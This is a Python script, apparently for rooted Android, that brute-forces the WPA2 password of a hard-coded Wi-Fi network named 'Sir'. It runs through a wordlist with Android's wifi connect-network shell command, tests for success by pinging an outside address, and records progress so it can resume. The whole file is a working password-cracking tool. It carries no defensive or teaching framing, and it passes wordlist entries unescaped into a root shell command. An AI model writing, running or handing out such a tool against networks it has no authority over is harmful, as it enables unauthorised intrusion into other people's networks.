import subprocess
import time
import sys
import threading
import os

SSID = "Sir"  # Target SSID
SECURITY = "wpa2"
WORDLIST_PATH = "passwords.txt"
PROGRESS_FILE = "wifi_bruteforce_progress.txt"
MAX_RETRIES = 3
WAIT_TIME = 5  # seconds after each attempt

# ---------- Core Helpers ----------
def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode, result.stdout.strip(), result.stderr.strip()

def is_connected():
    code, out, err = run_cmd("su -c 'ping -c 1 8.8.8.8'")
    return code == 0


def connect_to_wifi(password):
    cmd = f"su -c 'cmd wifi connect-network \"{SSID}\" {SECURITY} \"{password}\"'"
    code, out, err = run_cmd(cmd)
    return code == 0

# ---------- Progress Handling ----------
def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            return f.read().strip()
    return None

def save_progress(password):
    with open(PROGRESS_FILE, "w") as f:
        f.write(password)

# ---------- Brute-Force Logic ----------
def brute_force():
    print(f"📡 Starting Wi-Fi brute-force on SSID: {SSID}")

    try:
        with open(WORDLIST_PATH, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("❌ Failed to read wordlist:", e)
        sys.exit(1)

    start_from = load_progress()
    skip = bool(start_from)
    retries = {}

    for i, password in enumerate(passwords, 1):
        if skip:
            if password == start_from:
                skip = False
            continue

        print(f"🔁 [{i}/{len(passwords)}] Trying password: {password}")

        for attempt in range(1, MAX_RETRIES + 1):
            success = connect_to_wifi(password)
            time.sleep(WAIT_TIME)

            if is_connected():
                print(f"✅ SUCCESS! Password found: {password}")
                save_progress(password)
                return

            print(f"❌ Attempt {attempt} failed.")
            if attempt < MAX_RETRIES:
                print("↻ Retrying...")
                time.sleep(2)
            else:
                break  # Give up on this password

        save_progress(password)  # Save after every attempt

    print("💀 Brute-force complete. Password not found.")

# ---------- Start ----------
print("🔧 Enabling Wi-Fi...")
run_cmd("su -c 'svc wifi enable'")
time.sleep(3)

# Optional: run in thread (not needed here, but good structure)
thread = threading.Thread(target=brute_force)
thread.start()
thread.join()
